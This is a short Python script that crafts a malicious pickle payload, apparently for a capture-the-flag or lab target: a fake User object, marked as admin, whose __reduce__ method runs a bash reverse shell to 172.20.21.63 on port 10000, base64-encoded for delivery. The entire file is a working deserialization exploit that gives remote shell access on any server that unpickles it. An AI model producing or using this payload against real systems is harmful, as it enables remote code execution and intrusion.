import pickle
from base64 import b64encode
import os

User = type('User', (object,), {
    'uname': 'guest',
    'is_admin': 1,
    '__repr__': lambda o: o.uname,
    '__reduce__': lambda o: (eval, ("__import__('os').system('bash -i >&/dev/tcp/172.20.21.63/10000 0>& 1')",))

})
u = pickle.dumps(User())
print(b64encode(u).decode())

